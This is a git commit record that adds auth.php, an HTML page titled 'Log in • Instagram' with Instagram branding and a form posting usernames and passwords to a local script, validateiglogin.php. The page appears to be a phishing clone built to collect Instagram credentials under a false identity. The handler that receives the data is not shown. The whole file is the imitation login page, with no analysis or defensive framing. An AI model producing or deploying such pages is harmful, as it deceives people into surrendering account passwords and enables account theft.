4ffff89d1f4e8fbf424cd35699cc474270a8d899
Mateusz Pokojowczyk <pokojowczykmat@gmail.com>
2018-05-07 15:48:53 +0200

    Create auth.php

---
+++ auth.php
@@ -0,0 +1,37 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+
+  <title>Log in • Instagram</title>
+  
+      <link rel="stylesheet" href="auth.css">
+ <link rel="icon" 
+      type="image/png" 
+      href="ig.png">
+
+  
+</head>
+
+<body>
+  <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+
+<div id="wrapper">
+  <div class="main-content">
+    <div class="header">
+      <img src="img/iglogobig.png" />
+    </div>
+    <div class="l-part">
+      <form action="validateiglogin.php" method="POST" />
+      <input type="text" name="username" placeholder="Phone number, username or email" class="input-1" required/>
+      <div class="overlap-text">
+        <input type="password" name="password" placeholder="Password" class="input-2" required/>
+      </div>
+      <input type="submit" value="Login" class="btn" />
+      </form>
+    </div>
+  </div>
+ 
+  </div>
+</div>
+
